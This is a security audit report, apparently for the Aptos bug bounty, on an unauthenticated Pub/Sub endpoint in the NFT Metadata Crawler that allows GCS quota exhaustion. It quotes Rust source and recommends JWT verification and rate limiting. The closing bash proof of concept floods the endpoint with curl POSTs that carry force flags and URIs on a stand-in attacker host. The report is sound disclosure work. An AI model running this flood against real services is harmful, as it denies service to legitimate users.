# Audit Report

## Title
Unauthenticated HTTP Endpoint Enables GCS API Quota Exhaustion Attack on NFT Metadata Crawler

## Summary
The NFT Metadata Crawler's HTTP endpoint accepts unauthenticated POST requests without verifying they originate from Google Cloud Pub/Sub. An attacker can send crafted requests to trigger excessive calls to `write_json_to_gcs()`, exhausting GCS API quota limits and causing denial of service for legitimate NFT metadata uploads.

## Finding Description

The NFT Metadata Crawler implements a Google Cloud Pub/Sub push endpoint that processes incoming NFT metadata for upload to Google Cloud Storage. However, this endpoint lacks authentication verification, violating the **Resource Limits** invariant that states "All operations must respect gas, storage, and computational limits."

The attack flow is as follows:

1. The HTTP server binds to `0.0.0.0:{port}`, accepting connections from any network interface [1](#0-0) 

2. The POST endpoint at "/" accepts any incoming bytes without authentication [2](#0-1) 

3. Each message is parsed and spawns a Worker that processes the asset URI [3](#0-2) 

4. The Worker calls `write_json_to_gcs()` for each successfully parsed JSON [4](#0-3) 

5. The `write_json_to_gcs()` function makes GCS API calls with exponential backoff retry (3-4 attempts per call) [5](#0-4) 

6. While database-level deduplication exists [6](#0-5) , it can be bypassed by:
   - Using unique asset URIs in each crafted message
   - Setting the `force=true` flag (parsed from message field 5) [7](#0-6) 

**Attack Execution:**
An attacker crafts PubSub-formatted messages: `asset_data_id,asset_uri,version,timestamp,chain_id,force` and sends them as POST requests to the exposed endpoint. Each unique URI or `force=true` flag bypasses deduplication, triggering GCS API calls. With sufficient volume, this exhausts the GCS API quota (operations/second, bandwidth, or storage operations limits).

**Missing Protection:** Google Cloud Pub/Sub push endpoints should verify JWT tokens in the Authorization header to ensure requests originate from Google Cloud. This implementation performs no such verification, accepting any HTTP POST request as legitimate.

## Impact Explanation

This is a **HIGH severity** vulnerability under the Aptos bug bounty program criteria:

1. **API crashes**: Exhausting GCS quota causes all legitimate `write_json_to_gcs()` calls to fail [8](#0-7) 

2. **Service degradation**: The NFT metadata crawler becomes unable to process legitimate NFT metadata, blocking the entire NFT metadata indexing pipeline

3. **Significant protocol violation**: Violates the resource limits invariant by allowing unbounded external API consumption without authentication

While this doesn't directly affect consensus or blockchain state, it causes denial of service for a production infrastructure component critical to the Aptos NFT ecosystem.

## Likelihood Explanation

**Likelihood: HIGH**

This vulnerability is highly likely to be exploited because:

1. **Low barrier to entry**: The endpoint is exposed on all network interfaces (0.0.0.0), and no authentication is required
2. **Simple exploitation**: Attack requires only HTTP POST requests with comma-separated values
3. **No rate limiting**: No visible rate limiting or request throttling in the codebase
4. **Public service**: NFT metadata crawlers typically need to be publicly accessible to receive Pub/Sub messages
5. **Observable metrics**: The service exposes metrics counters for GCS uploads [9](#0-8) , making it easy for attackers to validate the attack's effectiveness

## Recommendation

Implement Google Cloud Pub/Sub push endpoint authentication by verifying JWT tokens. The fix should:

1. **Add JWT verification middleware** to the Axum router that validates incoming requests contain valid Google Cloud Pub/Sub JWT tokens in the Authorization header

2. **Verify token claims** including:
   - Token issuer matches Google's expected issuer
   - Audience matches the service's endpoint
   - Token signature is valid against Google's public keys
   - Email claim matches expected service accounts

3. **Add rate limiting** as defense-in-depth to limit requests per source IP or authenticated identity

4. **Implement request signing** as an alternative if JWT verification cannot be used

Example implementation approach (pseudocode):
```rust
// Add to parser/mod.rs
use axum::middleware;

async fn verify_pubsub_token(
    headers: HeaderMap,
    request: Request<Body>,
    next: Next,
) -> Result<Response, StatusCode> {
    // Extract and verify JWT token from Authorization header
    // Verify against Google's public keys
    // Check claims (issuer, audience, email)
    // Return 401 Unauthorized if verification fails
}

impl Server for ParserContext {
    fn build_router(&self) -> Router {
        let self_arc = Arc::new(self.clone());
        Router::new()
            .route("/", post(handler))
            .layer(middleware::from_fn(verify_pubsub_token)) // Add authentication
    }
}
```

Additionally, consider implementing application-level rate limiting based on authenticated identity.

## Proof of Concept

```bash
#!/bin/bash
# PoC: Exhaust GCS API quota by sending unauthenticated requests

ENDPOINT="http://[crawler-host]:[port]/"
CHAIN_ID=1
VERSION=1000000
TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S UTC")

# Send 1000 requests with unique URIs to bypass deduplication
for i in {1..1000}; do
  # Craft PubSub message: asset_data_id,asset_uri,version,timestamp,chain_id,force
  MESSAGE="attacker-id-$i,https://attacker.example.com/metadata-$i.json,$VERSION,$TIMESTAMP,$CHAIN_ID,true"
  
  # Send POST request (no authentication required)
  curl -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d "$MESSAGE" &
  
  # Small delay to avoid local rate limiting
  sleep 0.01
done

wait

# Monitor metrics endpoint to verify GCS upload attempts
curl "http://[crawler-host]:[health_port]/metrics" | grep gcs_upload_invocation_count
```

**Expected Outcome:**
- All 1000 requests are accepted without authentication checks
- Each triggers Worker::parse() and attempts JSON parsing
- For valid JSON responses, write_json_to_gcs() is called with 3-4 retry attempts each
- GCS API quota is consumed, causing legitimate uploads to fail
- Metrics show increased `nft_metadata_crawler_parser_gcs_upload_invocation_count`

**Validation:**
This PoC demonstrates the vulnerability without requiring privileged access, special credentials, or complex setup. The attack is trivially scalable and can be executed from any network location with HTTP access to the endpoint.

### Citations

**File:** ecosystem/nft-metadata-crawler/src/config.rs (L100-100)
```rust
        let listener = TcpListener::bind(format!("0.0.0.0:{}", self.server_port)).await?;
```

**File:** ecosystem/nft-metadata-crawler/src/parser/mod.rs (L155-166)
```rust
        let mut worker = Worker::new(
            self.parser_config.clone(),
            conn,
            self.parser_config.max_num_parse_retries,
            self.gcs_client.clone(),
            &pubsub_message,
            parts[0],
            parts[1],
            last_transaction_version,
            last_transaction_timestamp,
            parts[5].parse::<bool>().unwrap_or(false),
        );
```

**File:** ecosystem/nft-metadata-crawler/src/parser/mod.rs (L194-209)
```rust
            post(|bytes| async move {
                self_arc.spawn_parser(bytes).await;

                if !self_arc.parser_config.ack_parsed_uris {
                    return Response::builder()
                        .status(StatusCode::BAD_REQUEST)
                        .body("".to_string())
                        .unwrap();
                }

                PUBSUB_ACK_SUCCESS_COUNT.inc();
                Response::builder()
                    .status(StatusCode::OK)
                    .body("".to_string())
                    .unwrap()
            }),
```

**File:** ecosystem/nft-metadata-crawler/src/parser/worker.rs (L81-91)
```rust
        let prev_model = ParsedAssetUrisQuery::get_by_asset_uri(&mut self.conn, &self.asset_uri);
        if let Some(pm) = prev_model {
            DUPLICATE_ASSET_URI_COUNT.inc();
            self.model = pm.into();
            if !self.force && self.model.get_do_not_parse() {
                self.log_info("asset_uri has been marked as do_not_parse, skipping parse");
                SKIP_URI_COUNT.with_label_values(&["do_not_parse"]).inc();
                self.upsert();
                return Ok(());
            }
        }
```

**File:** ecosystem/nft-metadata-crawler/src/parser/worker.rs (L140-148)
```rust
            if json != Value::Null {
                self.log_info("Writing JSON to GCS");
                let cdn_json_uri_result = write_json_to_gcs(
                    &self.parser_config.bucket,
                    &self.asset_uri,
                    &json,
                    &self.gcs_client,
                )
                .await;
```

**File:** ecosystem/nft-metadata-crawler/src/utils/gcs.rs (L23-73)
```rust
pub async fn write_json_to_gcs(
    bucket: &str,
    uri: &str,
    json: &Value,
    client: &Client,
) -> anyhow::Result<String> {
    GCS_UPLOAD_INVOCATION_COUNT.inc();
    let hashed_uri = sha256::digest(uri);
    let filename = format!("cdn/{}.json", hashed_uri);
    let json_string = json.to_string();
    let json_bytes = json_string.into_bytes();

    let upload_type = UploadType::Simple(Media {
        name: filename.clone().into(),
        content_type: "application/json".into(),
        content_length: Some(json_bytes.len() as u64),
    });

    let op = || {
        async {
            Ok(client
                .upload_object(
                    &UploadObjectRequest {
                        bucket: bucket.to_string(),
                        ..Default::default()
                    },
                    json_bytes.clone(),
                    &upload_type,
                )
                .await
                .context("Error uploading JSON to GCS")?)
        }
        .boxed()
    };

    let backoff = ExponentialBackoff {
        max_elapsed_time: Some(Duration::from_secs(MAX_RETRY_TIME_SECONDS)),
        ..Default::default()
    };

    match retry(backoff, op).await {
        Ok(_) => {
            SUCCESSFULLY_UPLOADED_TO_GCS_COUNT.inc();
            Ok(filename)
        },
        Err(e) => {
            FAILED_TO_UPLOAD_TO_GCS_COUNT.inc();
            Err(e)
        },
    }
}
```

**File:** ecosystem/nft-metadata-crawler/src/utils/counters.rs (L211-217)
```rust
pub static GCS_UPLOAD_INVOCATION_COUNT: Lazy<IntCounter> = Lazy::new(|| {
    register_int_counter!(
        "nft_metadata_crawler_parser_gcs_upload_invocation_count",
        "Number of times the NFT Metadata Crawler Parser has attempted to upload to GCS"
    )
    .unwrap()
});
```
